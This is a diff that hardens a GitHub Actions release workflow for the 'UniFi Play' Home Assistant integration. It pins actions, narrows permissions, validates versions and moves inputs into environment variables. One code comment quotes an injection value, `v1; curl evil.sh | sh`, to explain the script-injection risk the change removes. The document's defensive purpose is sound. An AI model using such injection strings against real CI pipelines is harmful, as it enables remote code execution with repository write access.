@@ -10,62 +10,145 @@ on:
         description: "Release version, including the v (e.g. v1.0.8). The tag is created at the dispatched ref."
         required: true
 
+# Nothing outside the release job needs a token at all.
+permissions: {}
+
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
 jobs:
   release:
     name: Create Release
     runs-on: ubuntu-latest
     permissions:
+      # Creating a release, and the tag behind it on a dispatch, is the only
+      # write this workflow performs. No packages, no id-token, no pages.
       contents: write
     steps:
       - name: Checkout code
-        uses: actions/checkout@v6
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
+          # The changelog is built by walking back to the previous tag.
           fetch-depth: 0
+          persist-credentials: false
 
-      - name: Get version
-        id: get_version
+      # Every value that came from outside this file is read from the
+      # environment, never interpolated into the script body. A ${{ }} inside
+      # a run: block is pasted in as text before bash sees it, so a dispatch
+      # input of `v1; curl evil.sh | sh` would execute on a runner holding a
+      # token with contents: write.
+      - name: Resolve and validate the version
+        id: version
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            VERSION="${{ github.event.inputs.version }}"
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$INPUT_VERSION"
           else
-            VERSION=${GITHUB_REF#refs/tags/}
+            VERSION="$REF_NAME"
           fi
-          echo "VERSION=$VERSION" >> $GITHUB_OUTPUT
-          echo "VERSION_NUMBER=${VERSION#v}" >> $GITHUB_OUTPUT
+          # Semantic versioning, with an optional pre-release segment. The
+          # tag filter above only checks the shape v*.*.*, which `vX.Y.Z-`
+          # and `v1.2.3.4` both satisfy, and a version that is not semver is
+          # one HACS sorts unpredictably against the releases around it.
+          if ! printf '%s' "$VERSION" \
+            | grep -Eq '^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)(-[0-9A-Za-z.-]+)?$'; then
+            echo "::error::'$VERSION' is not a semantic version of the form v1.2.3 or v1.2.3-beta.1"
+            exit 1
+          fi
+          NUMBER="${VERSION#v}"
+          case "$NUMBER" in
+            *-*) PRERELEASE=true ;;
+            *)   PRERELEASE=false ;;
+          esac
+          {
+            echo "version=$VERSION"
+            echo "number=$NUMBER"
+            echo "prerelease=$PRERELEASE"
+          } >> "$GITHUB_OUTPUT"
 
-      - name: Get previous tag
-        id: prev_tag
-        run: |
-          # On a tag push the newest tag is the one being released, so the
-          # previous release is the second-newest; on dispatch the tag does
-          # not exist yet, so the newest existing tag is the previous release.
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            PREV_TAG=$(git describe --tags --abbrev=0 2>/dev/null || echo "")
-          else
-            PREV_TAG=$(git describe --abbrev=0 --tags $(git rev-list --tags --skip=1 --max-count=1) 2>/dev/null || echo "")
-          fi
-          echo "PREV_TAG=$PREV_TAG" >> $GITHUB_OUTPUT
+      - name: Set up Python
+        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.13"
+
+      # Builds from `git ls-files`, stamps fixed timestamps and modes, then
+      # reopens the archive and checks it entry by entry against the commit.
+      # It also refuses a version that manifest.json does not agree with,
+      # which is the mistake that ships a release HACS then reports as the
+      # previous one.
+      - name: Build and verify the release archive
+        env:
+          NUMBER: ${{ steps.version.outputs.number }}
+        run: python scripts/build_release_archive.py --version "$NUMBER"
 
       - name: Generate changelog
-        id: changelog
+        env:
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ -n "${{ steps.prev_tag.outputs.PREV_TAG }}" ]; then
-            CHANGELOG=$(git log ${{ steps.prev_tag.outputs.PREV_TAG }}..HEAD --pretty=format:"- %s" --no-merges)
+          set -euo pipefail
+          # On a tag push the newest tag is the one being released, so the
+          # previous release is the second-newest. On a dispatch the tag does
+          # not exist yet, so the newest existing tag is the previous release.
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            PREV_TAG=$(git describe --tags --abbrev=0 2>/dev/null || echo "")
           else
-            CHANGELOG=$(git log --pretty=format:"- %s" --no-merges)
+            PREV_TAG=$(git describe --abbrev=0 --tags "$(git rev-list --tags --skip=1 --max-count=1)" 2>/dev/null || echo "")
           fi
-          echo "CHANGELOG<<EOF" >> $GITHUB_OUTPUT
-          echo "$CHANGELOG" >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
+          {
+            echo "## What's Changed"
+            echo
+            if [ -n "$PREV_TAG" ]; then
+              git log "$PREV_TAG..HEAD" --pretty=format:'- %s' --no-merges
+            else
+              git log --pretty=format:'- %s' --no-merges
+            fi
+            echo
+          } > release-notes.md
+          # Written to a file rather than a step output: commit subjects
+          # are arbitrary text, and an output is a string that later steps
+          # interpolate.
+          {
+            echo
+            echo "## Install"
+            echo
+            echo "HACS installs from the repository as usual. For a manual install,"
+            echo "download \`unifi_play.zip\` and unpack it into"
+            echo "\`config/custom_components/\`, then restart Home Assistant."
+            echo
+            echo "The archive is built from the tagged commit with fixed timestamps"
+            echo "and file modes, so rebuilding it from this tag reproduces the"
+            echo "published checksum:"
+            echo
+            echo '```'
+            echo "python scripts/build_release_archive.py"
+            echo "sha256sum -c dist/unifi_play.zip.sha256"
+            echo '```'
+          } >> release-notes.md
 
       - name: Create release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ steps.get_version.outputs.VERSION }}
-          name: "UniFi Play ${{ steps.get_version.outputs.VERSION }}"
-          body: |
-            ## What's Changed
-            ${{ steps.changelog.outputs.CHANGELOG }}
-          prerelease: ${{ contains(steps.get_version.outputs.VERSION, 'beta') || contains(steps.get_version.outputs.VERSION, 'alpha') }}
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ steps.version.outputs.version }}
+          PRERELEASE: ${{ steps.version.outputs.prerelease }}
+          TARGET: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          PRERELEASE_FLAG=()
+          if [ "$PRERELEASE" = "true" ]; then
+            PRERELEASE_FLAG=(--prerelease)
+          fi
+          # gh is preinstalled on the runner. Using it rather than a
+          # third-party release action keeps the number of things that can
+          # push code into a job holding contents: write at zero.
+          gh release create "$VERSION" \
+            --target "$TARGET" \
+            --title "UniFi Play $VERSION" \
+            --notes-file release-notes.md \
+            "${PRERELEASE_FLAG[@]}" \
+            dist/unifi_play.zip \
+            dist/unifi_play.zip.sha256
